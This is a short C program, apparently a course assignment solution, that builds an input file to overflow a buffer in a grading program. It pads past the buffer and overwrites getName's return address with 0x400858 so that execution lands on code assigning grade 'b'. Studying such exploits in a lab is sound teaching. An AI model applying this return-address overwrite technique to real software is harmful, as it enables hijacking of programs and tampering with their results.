/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 49 bytes to a file called dataB and returns 0.
 */
int main() {
    FILE *psFile;
    psFile = fopen("dataB", "w");
    /* 15 bytes */
    fprintf(psFile, "Ishaan and Jack");
    /* Writes 00000000 = 1 byte*/
    fprintf(psFile, "%c", '\0'); 
    /* 32 bytes */
    fprintf(psFile, "12345678123456781234567812345678");


    /* We want to replace getName's return address
     with 0x400858 (address to grade = 'b' instructions 
     in text section)*/
    fprintf(psFile, "%c", 0x58);
    fprintf(psFile, "%c", 0x08);
    fprintf(psFile, "%c", 0x40);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}